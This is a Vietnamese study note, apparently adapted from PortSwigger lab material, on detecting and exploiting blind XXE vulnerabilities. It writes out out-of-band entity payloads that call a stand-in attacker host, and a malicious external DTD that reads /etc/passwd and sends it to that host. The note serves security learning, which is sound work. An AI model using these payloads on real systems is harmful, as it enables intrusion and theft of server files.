# Finding and exploiting blind XXE vulnerabilities
Trong phần này, chúng tôi sẽ giải thích tính năng chèn XXE mù là gì và mô tả các kỹ thuật khác nhau để tìm và khai thác các lỗ hổng XXE mù.
## What is blind XXE?
Lỗ hổng XXE mù phát sinh khi ứng dụng dễ bị tiêm XXE nhưng không trả về giá trị của bất kỳ thực thể bên ngoài nào được xác định trong phản hồi của nó. Điều này có nghĩa là không thể truy xuất trực tiếp các tệp phía máy chủ và do đó, XXE mù thường khó khai thác hơn các lỗ hổng XXE thông thường.\
Có hai cách chính để bạn có thể tìm và khai thác các lỗ hổng XXE ẩn:
- Bạn có thể kích hoạt các tương tác mạng ngoài băng tần, đôi khi lọc dữ liệu nhạy cảm trong dữ liệu tương tác.
- Bạn có thể kích hoạt các lỗi phân tích cú pháp XML theo cách các thông báo lỗi chứa dữ liệu nhạy cảm.
## Detecting blind XXE using out-of-band (OAST) techniques
Bạn thường có thể phát hiện XXE mù bằng cách sử dụng kỹ thuật tương tự như đối với các cuộc tấn công XXE SSRF nhưng kích hoạt tương tác mạng ngoài băng tần với hệ thống mà bạn kiểm soát. Ví dụ: bạn sẽ xác định một thực thể bên ngoài như sau:\
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`\
Sau đó, bạn sẽ sử dụng thực thể được xác định trong một giá trị dữ liệu trong XML.\
Cuộc tấn công XXE này khiến máy chủ thực hiện yêu cầu HTTP tới URL được chỉ định. Kẻ tấn công có thể theo dõi kết quả tra cứu DNS và yêu cầu HTTP, từ đó phát hiện rằng cuộc tấn công XXE đã thành công.

Ví dụ: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

Bài này chỉ cần bắn gói tin ra ngoài:\ 
![alt text](image-4.png)

Đôi khi, các cuộc tấn công XXE sử dụng các thực thể thông thường bị chặn do một số xác thực đầu vào của ứng dụng hoặc việc tăng cường trình phân tích cú pháp XML đang được sử dụng. Trong trường hợp này, bạn có thể sử dụng các thực thể tham số XML để thay thế. Các thực thể tham số XML là một loại thực thể XML đặc biệt chỉ có thể được tham chiếu ở nơi khác trong DTD. Vì mục đích hiện tại, bạn chỉ cần biết hai điều. Đầu tiên, việc khai báo một thực thể tham số XML bao gồm ký tự phần trăm trước tên thực thể:\
`<!ENTITY % myparameterentity "my parameter entity value" >`\
Và thứ hai, các thực thể tham số được tham chiếu bằng ký tự phần trăm thay vì ký hiệu thông thường:\
`%myparameterentity;`\
Điều này có nghĩa là bạn có thể kiểm tra XXE mù bằng cách sử dụng tính năng phát hiện ngoài băng tần thông qua các thực thể tham số XML như sau:\
`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`\
Tải trọng XXE này khai báo một thực thể tham số XML có tên là xxe và sau đó sử dụng thực thể đó trong DTD. Điều này sẽ thực hiện tra cứu DNS và yêu cầu HTTP tới miền của kẻ tấn công, xác minh rằng cuộc tấn công đã thành công.

Ví dụ: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

Tạo 1 thực thể: `% xxe`, gọi lại thực thể đó để thực thi gửi yêu cầu HTTP: `%xxe`:\
![alt text](image-5.png)

## Exploiting blind XXE to exfiltrate data out-of-band
Việc phát hiện lỗ hổng XXE mù thông qua các kỹ thuật ngoài băng tần là rất tốt, nhưng nó không thực sự chứng minh được lỗ hổng có thể bị khai thác như thế nào. Điều mà kẻ tấn công thực sự muốn đạt được là lấy cắp dữ liệu nhạy cảm. Điều này có thể đạt được thông qua lỗ hổng XXE mù, nhưng nó liên quan đến việc kẻ tấn công lưu trữ một DTD độc hại trên hệ thống mà chúng kiểm soát, sau đó gọi DTD bên ngoài từ bên trong tải trọng XXE trong băng tần.\
Một ví dụ về DTD độc hại nhằm lấy cắp nội dung của tệp `/etc/passwd` như sau:\
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
DTD này thực hiện các bước sau:\
- Xác định một thực thể tham số XML được gọi là `file`, chứa nội dung của tệp `/etc/passwd`.
- Xác định một thực thể tham số XML có tên là `eval`, chứa khai báo động của một thực thể tham số XML khác có tên là `exfiltrate`. Thực thể `exfiltrate` sẽ được đánh giá bằng cách tạo một yêu cầu HTTP tới máy chủ web của kẻ tấn công có chứa giá trị của thực thể `file` trong chuỗi truy vấn URL.
- Sử dụng thực thể `eval` để thực hiện khai báo động của thực thể `exfiltrate`.
- Sử dụng thực thể `exfiltrate` để giá trị của nó được đánh giá bằng cách yêu cầu URL được chỉ định

Sau đó, kẻ tấn công phải lưu trữ DTD độc hại trên hệ thống mà chúng kiểm soát, thông thường bằng cách tải nó lên máy chủ web của riêng chúng. Ví dụ: kẻ tấn công có thể phân phát DTD độc hại tại URL sau:\
`http://web-attacker.com/malicious.dtd`\
Cuối cùng, kẻ tấn công phải gửi tải trọng XXE sau tới ứng dụng dễ bị tấn công:\
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
Payload XXE này khai báo một thực thể tham số XML có tên là `xxe` và sau đó sử dụng thực thể đó trong DTD. Điều này sẽ khiến trình phân tích cú pháp XML tìm nạp DTD bên ngoài từ máy chủ của kẻ tấn công và diễn giải nó nội tuyến. Sau đó, các bước được xác định trong DTD độc hại sẽ được thực thi và tệp `/etc/passwd` được truyền đến máy chủ của kẻ tấn công.

Kỹ thuật này có thể không hoạt động với một số nội dung tệp, bao gồm các ký tự dòng mới có trong tệp `/etc/passwd`. Điều này là do một số trình phân tích cú pháp XML tìm nạp URL trong định nghĩa thực thể bên ngoài bằng cách sử dụng API xác thực các ký tự được phép xuất hiện trong URL. Trong trường hợp này, có thể sử dụng giao thức `FTP` thay vì `HTTP`. Đôi khi, không thể lọc dữ liệu chứa các ký tự dòng mới và do đó, thay vào đó, một tệp như `/etc/hostname` có thể được nhắm mục tiêu.

Ví dụ: 







